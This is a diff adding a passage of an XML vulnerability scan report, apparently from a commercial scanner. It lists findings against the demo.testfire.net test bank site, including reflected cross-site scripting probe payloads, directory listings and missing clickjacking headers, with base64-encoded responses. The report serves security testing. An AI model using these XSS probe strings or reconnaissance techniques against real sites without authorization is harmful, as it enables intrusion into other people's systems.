+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD>@PATH@test.aspx</PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/test.aspx</URL>
+                            <HEADERS>
+                                <HEADER>
+                                    <key>Referer</key>
+                                    <value><![CDATA[ http://demo.testfire.net/bank/login.aspx]]></value>
+                                </HEADER>
+                                <HEADER>
+                                    <key>Cookie</key>
+                                    <value><![CDATA[ lang=; amSessionId=134181910182; ASP.NET_SessionId=dempej550dq4y445u5t53p45;]]></value>
+                                </HEADER>
+                            </HEADERS>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9L
+]]></CONTENTS>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034781</ID>
+                <DETECTION_ID>4293600</DETECTION_ID>
+                <QID>150084</QID>
+                <URL>http://demo.testfire.net/search.aspx</URL>
+                <PARAM>txtSearch</PARAM>
+                <FORM_ENTRY_POINT>http://demo.testfire.net/bank/login.aspx</FORM_ENTRY_POINT>
+                <ACCESS_PATH>
+                    <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                </ACCESS_PATH>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD>txtSearch=%22'%3E%3C%3CSCRIPT%20a%3D2%3Eqss%3D7%3B%2F%2F%3C%3C%2FSCRIPT%3E</PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/search.aspx?txtSearch=%22'%3E%3C%3CSCRIPT%20a%3D2%3Eqss%3D7%3B%2F%2F%3C%3C%2FSCRIPT%3E</URL>
+                            <HEADERS>
+                                <HEADER>
+                                    <key>Referer</key>
+                                    <value><![CDATA[ http://demo.testfire.net/bank/login.aspx]]></value>
+                                </HEADER>
+                                <HEADER>
+                                    <key>Cookie</key>
+                                    <value><![CDATA[ lang=; amSessionId=132271899100; ASP.NET_SessionId=tskomp45ivi55r4530tp5g2a;]]></value>
+                                </HEADER>
+                            </HEADERS>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[Y29tbWVudDogQSBzaWduaWZpY2FudCBwb3J0aW9uIG9mIHRoZSBYU1MgdGVzdCBwYXlsb2FkIGFw
+cGVhcmVkIGluIHRoZSB3ZWIgcGFnZSwgYnV0IHRoZSBwYWdlJ3MgRE9NIHdhcyBub3QgbW9kaWZp
+ZWQgYXMgZXhwZWN0ZWQgZm9yIGEgc3VjY2Vzc2Z1bCBleHBsb2l0LiBUaGlzIHJlc3VsdCBzaG91
+bGQgYmUgbWFudWFsbHkgdmVyaWZpZWQgdG8gZGV0ZXJtaW5lIGl0cyBhY2N1cmFjeS4KClJlc3Bv
+bnNlIGNvbnRlbnQtdHlwZTogdGV4dC9odG1sCgpsPg0KICAgIDwvdGQ+DQogICAgPHRkIHZhbGln
+bj0idG9wIiBjb2xzcGFuPSIzIiBjbGFzcz0iYmIiPg0KDQoNCjxkaXYgY2xhc3M9ImZsIiBzdHls
+ZT0id2lkdGg6IDk5JTsiPg0KDQo8aDE+U2VhcmNoIFJlc3VsdHM8L2gxPg0KDQo8cD5ObyByZXN1
+bHRzIHdlcmUgZm91bmQgZm9yIHRoZSBxdWVyeTo8YnIgLz48YnIgLz4NCjxzcGFuIGlkPSJfY3Rs
+MF9fY3RsMF9Db250ZW50X01haW5fbGJsU2VhcmNoIj4iJz48PFNDUklQVCBhPTI+cXNzPTc7Ly88
+PC9TQ1JJUFQ+PC9zcGFuPjwvcD4NCg0KPC9kaXY+DQoNCg0KICAgIDwvdGQ+DQogIDwvdHI+DQo8
+L3RhYmxlPg0KDQoNCjwvZGl2Pg0KDQo8ZGl2IGlkPSJmb290ZXIiIHN0eWxlPSJ3aWR0aDogOTkl
+OyI+DQogICAgPGEgaWQ9Il9jdGwwX19jdGwwX0h5cGVyTGluazUiIGhyZWY9ImRlZmF1bHQuYXNw
+eD9jb250ZW50PXByaXZhY3kuaHRtIj5Qcml2YWN5IFBvbGljeTwvYT4NCiAgICAmbmJzcDsmbmJz
+cDt8Jm5ic3A7Jm5ic3A7DQ==
+]]></CONTENTS>
+                            <EVIDENCE base64="true"><![CDATA[PDxTQ1JJUFQgYT0yPnFzcz03Oy8vPDwvU0NSSVBUPg==
+]]></EVIDENCE>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034755</ID>
+                <DETECTION_ID>4293574</DETECTION_ID>
+                <QID>150059</QID>
+                <URL>http://demo.testfire.net/feedback.aspx</URL>
+                <ACCESS_PATH>
+                    <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                </ACCESS_PATH>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD></PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/feedback.aspx</URL>
+                            <HEADERS>
+                                <HEADER>
+                                    <key>Referer</key>
+                                    <value><![CDATA[ http://demo.testfire.net/bank/login.aspx]]></value>
+                                </HEADER>
+                                <HEADER>
+                                    <key>Cookie</key>
+                                    <value><![CDATA[ lang=; amSessionId=132271899100; ASP.NET_SessionId=tskomp45ivi55r4530tp5g2a;]]></value>
+                                </HEADER>
+                            </HEADERS>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[TDpcYmFja3VwXHdlYnNpdGVcb2xkZmlsZXM=
+]]></CONTENTS>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034776</ID>
+                <DETECTION_ID>4293595</DETECTION_ID>
+                <QID>150023</QID>
+                <URL>http://demo.testfire.net/bank/.</URL>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD>@PATH@.</PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/bank/.</URL>
+                            <HEADERS>
+                                <HEADER>
+                                    <key>Referer</key>
+                                    <value><![CDATA[ http://demo.testfire.net/bank/login.aspx]]></value>
+                                </HEADER>
+                                <HEADER>
+                                    <key>Cookie</key>
+                                    <value><![CDATA[ lang=; amSessionId=134181910182; ASP.NET_SessionId=dempej550dq4y445u5t53p45;]]></value>
+                                </HEADER>
+                            </HEADERS>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[PGh0bWw+PGhlYWQ+PHRpdGxlPmRlbW8udGVzdGZpcmUubmV0IC0gL2JhbmsvPC90aXRsZT48L2hl
+YWQ+PGJvZHk+PEgxPmRlbW8udGVzdGZpcmUubmV0IC0gL2JhbmsvPC9IMT48aHI+DQoNCjxwcmU+
+PEEgSFJFRj0iLyI+W1RvIFBhcmVudCBEaXJlY3RvcnldPC9BPjxicj48YnI+IDUvMTAvMjAxNSAg
+NDoyNSBBTSAgICAgICAgPGRpcj4gPEEgSFJFRj0iL2JhbmsvMjAwNjAzMDhfYmFrLyI+MjAwNjAz
+MDhfYmFrPC9BPjxicj4xMS8yMC8yMDA2IDEwOjA1IEFNICAgICAgICAgMTgzMSA8QSBIUkVGPSIv
+YmFuay9hY2NvdW50LmFzcHgiPmFjY291bnQuYXNweDwvQT48YnI+IDYvMTgvMjAxNSAgNzo0MSBQ
+TSAgICAgICAgIDUwNjcgPEEgSFJFRj0iL2JhbmsvYWNjb3VudC5hc3B4LmNzIj5hY2NvdW50LmFz
+cHguY3M8L0E+PGJyPjExLzIwLzIwMDYgMTA6MDUgQU0gICAgICAgICAgNzcxIDxBIEhSRUY9Ii9i
+YW5rL2FwcGx5LmFzcHgiPmFwcGx5LmFzcHg8L0E+PGJyPjExLzI=
+]]></CONTENTS>
+                            <EVIDENCE base64="true"><![CDATA[VG8gUGFyZW50IERpcmVjdG9yeQ==
+]]></EVIDENCE>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034765</ID>
+                <DETECTION_ID>4293584</DETECTION_ID>
+                <QID>150161</QID>
+                <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD>N/A</PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                            <HEADERS/>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[QVNQLk5FVF9TZXNzaW9uSWQ9dHNrb21wNDVpdmk1NXI0NTMwdHA1ZzJhOyBwYXRoPS87IGRvbWFp
+bj1kZW1vLnRlc3RmaXJlLm5ldDsgaHR0cG9ubHk=
+]]></CONTENTS>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034771</ID>
+                <DETECTION_ID>4293590</DETECTION_ID>
+                <QID>150081</QID>
+                <URL>http://demo.testfire.net/bank/main.aspx</URL>
+                <ACCESS_PATH>
+                    <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                </ACCESS_PATH>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD>N/A</PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/bank/main.aspx</URL>
+                            <HEADERS/>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[VGhlIHJlc3BvbnNlIGZvciB0aGlzIHJlcXVlc3QgZWl0aGVyIGRpZCBub3QgaGF2ZSBhbiAiWC1G
+UkFNRS1PUFRJT05TIiBoZWFkZXIgcHJlc2VudCBvciB3YXMgbm90IHNldCB0byBERU5ZIG9yIFNB
+TUVPUklHSU4K
+]]></CONTENTS>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034743</ID>
+                <DETECTION_ID>4293562</DETECTION_ID>
+                <QID>150081</QID>
+                <URL>http://demo.testfire.net/bank/account.aspx</URL>
+                <ACCESS_PATH>
+                    <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                </ACCESS_PATH>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD>N/A</PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/bank/account.aspx</URL>
+                            <HEADERS/>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[VGhlIHJlc3BvbnNlIGZvciB0aGlzIHJlcXVlc3QgZWl0aGVyIGRpZCBub3QgaGF2ZSBhbiAiWC1G
+UkFNRS1PUFRJT05TIiBoZWFkZXIgcHJlc2VudCBvciB3YXMgbm90IHNldCB0byBERU5ZIG9yIFNB
+TUVPUklHSU4K
+]]></CONTENTS>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034774</ID>
+                <DETECTION_ID>4293593</DETECTION_ID>
+                <QID>150001</QID>
+                <URL>http://demo.testfire.net/notfound.aspx?aspxerrorpath=/Privacypolicy.aspx</URL>
+                <PARAM>aspxerrorpath</PARAM>
+                <ACCESS_PATH>
+                    <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                    <URL>http://demo.testfire.net/default.aspx?content=inside_careers.htm</URL>
+                    <URL><![CDATA[http://demo.testfire.net/Privacypolicy.aspx?sec=Careers&template=US]]></URL>
+                </ACCESS_PATH>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD>aspxerrorpath=z--%3E%3Cqss%3E</PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/notfound.aspx?aspxerrorpath=z--%3E%3Cqss%3E</URL>
+                            <HEADERS>
+                                <HEADER>
+                                    <key>Referer</key>
+                                    <value><![CDATA[ http://demo.testfire.net/bank/login.aspx]]></value>
+                                </HEADER>
+                                <HEADER>
+                                    <key>Cookie</key>
+                                    <value><![CDATA[ lang=; amSessionId=132271899100; ASP.NET_SessionId=tskomp45ivi55r4530tp5g2a;]]></value>
+                                </HEADER>
+                            </HEADERS>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[Y29tbWVudDogClJlc3BvbnNlIGNvbnRlbnQtdHlwZTogdGV4dC9odG1sCgogICAgICA8L3VsPg0K
+ICAgIDwvdGQ+DQogICAgPHRkIHZhbGlnbj0idG9wIiBjb2xzcGFuPSIzIiBjbGFzcz0iYmIiPg0K
+DQoNCjxkaXYgY2xhc3M9ImZsIiBzdHlsZT0id2lkdGg6IDk5JTsiPg0KDQo8aDE+QW4gRXJyb3Ig
+SGFzIE9jY3VycmVkPC9oMT4NCg0KPHA+PHNwYW4gaWQ9Il9jdGwwX19jdGwwX0NvbnRlbnRfTWFp
+bl9lcnJvciI+Q291bGQgbm90IGZpbmQgdGhlIHBhZ2UgeW91IHJlcXVlc3RlZC4gPGJyPjxicj48
+Yj56LS0+PHFzcz48L2I+PGJyPjxicj5QbGVhc2UgY2hlY2sgeW91ciBzcGVsbGluZy4gSWYgdGhl
+IHNwZWxsaW5nIGlzIGNvcnJlY3QgYW5kIHRoZSBwYWdlIHN0aWxsIGRvZXMgbm90IGV4aXN0IGNv
+bnRhY3QgdGhlIFN5c3RlbSBBZG1pbmlzdHJhdG9yLjwvc3Bhbj48L3A+DQoNCjwvZGl2Pg0KDQoN
+CiAgICA8L3RkPg0KICA8L3RyPg0KPC90YWJsZT4NCg0KDQo8L2Rpdj4NCg0KPGRpdiBpZD0iZm9v
+dGVyIiBzdHlsZT0id2lkdGg6IDk5JTsiPg0KICAgIA==
+]]></CONTENTS>
+                            <EVIDENCE base64="true"><![CDATA[PHFzcz4=
+]]></EVIDENCE>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034777</ID>
+                <DETECTION_ID>4293596</DETECTION_ID>
+                <QID>150004</QID>
+                <URL>http://demo.testfire.net/bank/.</URL>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD></PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/bank/.</URL>
+                            <HEADERS>
+                                <HEADER>
+                                    <key>Referer</key>
+                                    <value><![CDATA[ http://demo.testfire.net/bank/login.aspx]]></value>
+                                </HEADER>
+                            </HEADERS>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[Y29tbWVudDogVGhpcyBkaXJlY3Rvcnkgd2FzIGRpc2NvdmVyZWQgZHVyaW5nIHRoZSBjcmF3bCBw
+aGFzZS4KCjxodG1sPjxoZWFkPjx0aXRsZT5kZW1vLnRlc3RmaXJlLm5ldCAtIC9iYW5rLzwvdGl0
+bGU+PC9oZWFkPjxib2R5PjxIMT5kZW1vLnRlc3RmaXJlLm5ldCAtIC9iYW5rLzwvSDE+PGhyPg0K
+DQo8cHJlPjxBIEhSRUY9Ii8iPltUbyBQYXJlbnQgRGlyZWN0b3J5XTwvQT48YnI+PGJyPiA1LzEw
+LzIwMTUgIDQ6MjUgQU0gICAgICAgIDxkaXI+IDxBIEhSRUY9Ii9iYW5rLzIwMDYwMzA4X2Jhay8i
+PjIwMDYwMzA4X2JhazwvQT48YnI+MTEvMjAvMjAwNiAxMDowNSBBTSAgICAgICAgIDE4MzEgPEEg
+SFJFRj0iL2JhbmsvYWNjb3VudC5hc3B4Ij5hY2NvdW50LmFzcHg8L0E+PGJyPiA2LzE4LzIwMTUg
+IDc6NDEgUE0gICAgICAgICA1MDY3IDxBIEhSRUY9Ii9iYW5rL2FjY291bnQuYXNweC5jcyI+YWNj
+b3VudC5hc3B4LmNzPC9BPjxicj4xMS8yMC8yMDA2IDEwOjA1IEFNICAgICAgICAgIDc3MSA8QSBI
+UkVGPSIvYmFuay9hcHBseS5hc3B4Ij5hcHBseS5hc3B4PC9BPjxicj4xMS8y
+]]></CONTENTS>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034773</ID>
+                <DETECTION_ID>4293592</DETECTION_ID>
+                <QID>150084</QID>
+                <URL>http://demo.testfire.net/notfound.aspx?aspxerrorpath=/Privacypolicy.aspx</URL>
+                <PARAM>aspxerrorpath</PARAM>
+                <ACCESS_PATH>
+                    <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                    <URL>http://demo.testfire.net/default.aspx?content=inside_careers.htm</URL>
+                    <URL><![CDATA[http://demo.testfire.net/Privacypolicy.aspx?sec=Careers&template=US]]></URL>
+                </ACCESS_PATH>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD><![CDATA[%00<script>_q=random(@REQUESTID@)</script>]]></PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/notfound.aspx?aspxerrorpath=%00%3Cscript%3E_q%3Drandom(X3072637368Y1Z)%3C%2Fscript%3E</URL>
+                            <HEADERS>
+                                <HEADER>
+                                    <key>Referer</key>
+                                    <value><![CDATA[ http://demo.testfire.net/bank/login.aspx]]></value>
+                                </HEADER>
+                                <HEADER>
+                                    <key>Cookie</key>
+                                    <value><![CDATA[ lang=; amSessionId=132271899100; ASP.NET_SessionId=tskomp45ivi55r4530tp5g2a;]]></value>
+                                </HEADER>
+                            </HEADERS>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[Y29tbWVudDogQSBzaWduaWZpY2FudCBwb3J0aW9uIG9mIHRoZSBYU1MgdGVzdCBwYXlsb2FkIGFw
+cGVhcmVkIGluIHRoZSB3ZWIgcGFnZSwgYnV0IHRoZSBwYWdlJ3MgRE9NIHdhcyBub3QgbW9kaWZp
+ZWQgYXMgZXhwZWN0ZWQgZm9yIGEgc3VjY2Vzc2Z1bCBleHBsb2l0LiBUaGlzIHJlc3VsdCBzaG91
+bGQgYmUgbWFudWFsbHkgdmVyaWZpZWQgdG8gZGV0ZXJtaW5lIGl0cyBhY2N1cmFjeS4KClJlc3Bv
+bnNlIGNvbnRlbnQtdHlwZTogdGV4dC9odG1sCgogIDwvdGQ+DQogICAgPHRkIHZhbGlnbj0idG9w
+IiBjb2xzcGFuPSIzIiBjbGFzcz0iYmIiPg0KDQoNCjxkaXYgY2xhc3M9ImZsIiBzdHlsZT0id2lk
+dGg6IDk5JTsiPg0KDQo8aDE+QW4gRXJyb3IgSGFzIE9jY3VycmVkPC9oMT4NCg0KPHA+PHNwYW4g
+aWQ9Il9jdGwwX19jdGwwX0NvbnRlbnRfTWFpbl9lcnJvciI+Q291bGQgbm90IGZpbmQgdGhlIHBh
+Z2UgeW91IHJlcXVlc3RlZC4gPGJyPjxicj48Yj4=
+]]></CONTENTS>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034775</ID>
+                <DETECTION_ID>4293594</DETECTION_ID>
+                <QID>150004</QID>
+                <URL>http://demo.testfire.net/pr/.</URL>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD></PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/pr/.</URL>
+                            <HEADERS>
+                                <HEADER>
+                                    <key>Referer</key>
+                                    <value><![CDATA[ http://demo.testfire.net/bank/login.aspx]]></value>
+                                </HEADER>
+                                <HEADER>
+                                    <key>Cookie</key>
+                                    <value><![CDATA[ lang=; amSessionId=132271899100; ASP.NET_SessionId=tskomp45ivi55r4530tp5g2a;]]></value>
+                                </HEADER>
+                            </HEADERS>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[Y29tbWVudDogVGhpcyBkaXJlY3Rvcnkgd2FzIGRpc2NvdmVyZWQgZHVyaW5nIHRoZSBjcmF3bCBw
+aGFzZS4KCjxodG1sPjxoZWFkPjx0aXRsZT5kZW1vLnRlc3RmaXJlLm5ldCAtIC9wci88L3RpdGxl
+PjwvaGVhZD48Ym9keT48SDE+ZGVtby50ZXN0ZmlyZS5uZXQgLSAvcHIvPC9IMT48aHI+DQoNCjxw
+cmU+PEEgSFJFRj0iLyI+W1RvIFBhcmVudCBEaXJlY3RvcnldPC9BPjxicj48YnI+IDcvMjAvMjAw
+NyAgODo0NSBBTSAgICAgICAgNjM4ODcgPEEgSFJFRj0iL3ByL2NvbW11bml0eWFubnVhbHJlcG9y
+dC5wZGYiPmNvbW11bml0eWFubnVhbHJlcG9ydC5wZGY8L0E+PGJyPiAxMS8xLzIwMDYgMTA6MTMg
+UE0gICAgICAgICAgODA0IDxBIEhSRUY9Ii9wci9Eb2NzLnhtbCI+RG9jcy54bWw8L0E+PGJyPiAz
+LzEzLzIwMDYgMTA6MTIgQU0gICAgICAgIDExMjgxIDxBIEhSRUY9Ii9wci9EcmFmdC5ydGYiPkRy
+YWZ0LnJ0ZjwvQT48YnI+IDcvMjAvMjAwNyAgOTo0MSBBTSAgICAgICAxODc3NTQgPEEgSFJFRj0i
+L3ByL1EzX2Vhcm5pbmdzLnJ0ZiI+UTNfZWFybmluZ3MucnRmPC9BPjxicj48L3ByZT48
+]]></CONTENTS>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034782</ID>
+                <DETECTION_ID>4293601</DETECTION_ID>
+                <QID>150001</QID>
+                <URL>http://demo.testfire.net/search.aspx</URL>
+                <PARAM>txtSearch</PARAM>
+                <FORM_ENTRY_POINT>http://demo.testfire.net/bank/login.aspx</FORM_ENTRY_POINT>
+                <ACCESS_PATH>
+                    <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                </ACCESS_PATH>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD>txtSearch=%22'%3E%3Cqss%20%60%3b!--%3D%26%7b()%7d%3E</PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/search.aspx?txtSearch=%22'%3E%3Cqss%20%60%3b!--%3D%26%7b()%7d%3E</URL>
+                            <HEADERS>
+                                <HEADER>
+                                    <key>Referer</key>
+                                    <value><![CDATA[ http://demo.testfire.net/bank/login.aspx]]></value>
+                                </HEADER>
+                                <HEADER>
+                                    <key>Cookie</key>
+                                    <value><![CDATA[ lang=; amSessionId=132271899100; ASP.NET_SessionId=tskomp45ivi55r4530tp5g2a;]]></value>
+                                </HEADER>
+                            </HEADERS>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[Y29tbWVudDogClJlc3BvbnNlIGNvbnRlbnQtdHlwZTogdGV4dC9odG1sCgogICAgPC91bD4NCiAg
+ICA8L3RkPg0KICAgIDx0ZCB2YWxpZ249InRvcCIgY29sc3Bhbj0iMyIgY2xhc3M9ImJiIj4NCg0K
+DQo8ZGl2IGNsYXNzPSJmbCIgc3R5bGU9IndpZHRoOiA5OSU7Ij4NCg0KPGgxPlNlYXJjaCBSZXN1
